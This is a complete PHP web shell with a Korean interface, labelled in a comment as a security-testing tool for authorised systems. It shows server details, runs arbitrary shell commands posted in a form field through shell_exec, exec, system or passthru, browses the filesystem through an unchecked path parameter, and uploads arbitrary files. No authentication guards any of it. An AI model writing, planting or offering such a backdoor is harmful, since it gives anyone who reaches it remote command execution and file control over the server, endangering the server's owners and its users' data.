<?php
// 보안 테스트용 PHP 웹쉘
// 주의: 허가된 시스템에서만 사용하세요
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Security Test Tool</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 20px; }
        .container { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        pre { background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }
        input[type="text"] { width: 70%; padding: 8px; margin-right: 10px; }
        input[type="submit"] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="container">
        <h2>시스템 정보</h2>
        <pre>
서버 정보: <?php echo php_uname(); ?>
PHP 버전: <?php echo phpversion(); ?>
웹서버: <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
현재 경로: <?php echo getcwd(); ?>
현재 사용자: <?php echo get_current_user(); ?>
        </pre>
        
        <h2>명령어 실행</h2>
        <form method="post">
            <input type="text" name="cmd" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : 'id'; ?>">
            <input type="submit" value="실행">
        </form>
        
        <?php if (isset($_POST['cmd'])): ?>
        <h3>실행 결과:</h3>
        <pre>
<?php
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        echo htmlspecialchars(shell_exec($cmd));
    } elseif (function_exists('exec')) {
        exec($cmd, $output, $return_var);
        echo htmlspecialchars(implode("\n", $output));
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
        echo htmlspecialchars($output);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
        echo htmlspecialchars($output);
    } else {
        echo "명령어 실행 함수를 사용할 수 없습니다.";
    }
?>
        </pre>
        <?php endif; ?>
        
        <h2>현재 디렉토리 탐색</h2>
        <?php
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $path = realpath($path);
            if (!$path) {
                $path = getcwd();
            }
            
            $files = scandir($path);
        ?>
        <p>현재 경로: <?php echo htmlspecialchars($path); ?></p>
        <?php if ($path != '/') { ?>
            <a href="?path=<?php echo urlencode(dirname($path)); ?>">..</a>
        <?php } ?>
        
        <table>
            <tr>
                <th>타입</th>
                <th>이름</th>
                <th>크기</th>
                <th>권한</th>
                <th>최종 수정일</th>
            </tr>
            <?php foreach ($files as $file): ?>
                <?php if ($file == '.' || ($file == '..' && $path == '/')) continue; ?>
                <?php $fullpath = $path . DIRECTORY_SEPARATOR . $file; ?>
                <tr>
                    <td><?php echo is_dir($fullpath) ? '디렉토리' : '파일'; ?></td>
                    <td>
                        <?php if (is_dir($fullpath)): ?>
                            <a href="?path=<?php echo urlencode($fullpath); ?>"><?php echo htmlspecialchars($file); ?></a>
                        <?php else: ?>
                            <?php echo htmlspecialchars($file); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo is_file($fullpath) ? number_format(filesize($fullpath)) . ' bytes' : '-'; ?></td>
                    <td><?php echo substr(sprintf('%o', fileperms($fullpath)), -4); ?></td>
                    <td><?php echo date('Y-m-d H:i:s', filemtime($fullpath)); ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
        
        <h2>파일 업로더</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="uploadfile"><br><br>
            <input type="submit" name="upload" value="업로드">
        </form>
        
        <?php
        if (isset($_POST['upload'])) {
            if (isset($_FILES['uploadfile']) && $_FILES['uploadfile']['error'] == 0) {
                $uploadfile = $path . DIRECTORY_SEPARATOR . basename($_FILES['uploadfile']['name']);
                if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $uploadfile)) {
                    echo "<p style='color:green'>파일이 성공적으로 업로드되었습니다: " . htmlspecialchars($uploadfile) . "</p>";
                } else {
                    echo "<p style='color:red'>파일 업로드 실패!</p>";
                }
            }
        }
        ?>
    </div>
</body>
</html>